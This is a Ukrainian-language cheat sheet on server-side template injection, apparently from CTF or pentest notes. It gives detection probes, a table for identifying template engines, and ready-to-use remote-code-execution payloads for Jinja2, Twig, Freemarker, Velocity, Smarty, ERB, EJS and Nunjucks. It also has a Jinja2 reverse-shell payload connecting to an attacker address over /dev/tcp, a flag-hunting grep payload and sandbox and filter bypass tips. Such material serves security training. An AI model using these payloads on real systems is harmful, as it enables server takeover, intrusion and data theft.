# Cheatsheet: SSTI (Server-Side Template Injection)

Ввід потрапляє у шаблонізатор на сервері → від відображення математики до повного RCE.
Типові місця: вітання за іменем, профіль, пошук, email-прев'ю, помилки з відображенням вводу.
← [web-enum](../02-workflows/web-enum.md) · [web-vulns](../04-techniques/web-vulns-overview.md) · [revshells](webshells-revshells.md)

## 1. Виявлення (один пейлоад на всі рушії)
```
${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  @(7*7)
```
Вивід `49` (чи `7777777`) замість сирого тексту → шаблон виконується. Полісемний зонд:
```
${{<%[%'"}}%\.     # ламає більшість рушіїв → stack trace з назвою рушія у відповіді
```

## 2. Визначити рушій (гілкування за результатом)
| Тест | Результат → рушій |
|---|---|
| `{{7*7}}`=49, `{{7*'7'}}`=`7777777` | Jinja2 / Twig (Python/PHP) |
| `{{7*7}}`=49, `{{7*'7'}}`=помилка | Twig старий / Nunjucks |
| `${7*7}`=49 | Freemarker / Velocity (Java), Thymeleaf |
| `#{7*7}`=49 | Ruby ERB-подібні / Thymeleaf |
| `<%= 7*7 %>`=49 | ERB (Ruby), EJS (Node) |
| `${7*7}` без виконання, `${{7*7}}`=49 | Smarty (PHP) |

## 3. RCE по рушіях (готові пейлоади)
```jinja
# Jinja2 (Python / Flask) — найчастіший
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```
```twig
# Twig (PHP / Symfony)
{{ ['id']|filter('system') }}
{{ ['id','']|sort('system') }}
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
```
```
# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
# Velocity (Java)
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("exec",$e.getClass()).invoke(null,"id")
# Smarty (PHP)
{system('id')}   {php}system('id');{/php}
# ERB (Ruby)
<%= `id` %>   <%= system('id') %>
# EJS / Nunjucks (Node)
<%= global.process.mainModule.require('child_process').execSync('id') %>
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

## 4. Зразу reverse shell
```jinja
{{ cycler.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.8.N.x/4444 0>&1"').read() }}
```
Listener: `nc -lvnp 4444` на VPN-адресі → [netcat](netcat-socat.md) · повні payload-и [revshells](webshells-revshells.md).
URL через POST часто зручніший за GET (менше проблем з `{}`/пробілами):
```bash
curl -s "http://$TARGET/greet" --data-urlencode "name={{7*7}}"
```

## 5. Пошук прапорців через здобутий RCE
```
{{ cycler.__init__.__globals__.os.popen("grep -raoHE 'b[-_.]*e[-_.]*s[-_.]*t[-_.]*C[-_.]*T[-_.]*F[-_.]*\\{[[:alnum:]_]+\\}:[A-Za-z0-9]+' / 2>/dev/null").read() }}
```

## Пастки / читання
- `49` у відповіді → підтверджено; далі визначити рушій зондом з п.2, не вгадувати пейлоад наосліп.
- Пісочниця (SandboxedEnvironment у Jinja) ріже `__globals__` → пробувати `cycler`/`joiner`/`namespace` gadget-и або `request.application`.
- Немає прямого виводу (blind) → `sleep`/OOB як у [command-injection](command-injection.md), потім revshell.
- Фільтр на `{{`/`}}` → `${{...}}`, подвоєння, інші дужки рушія.
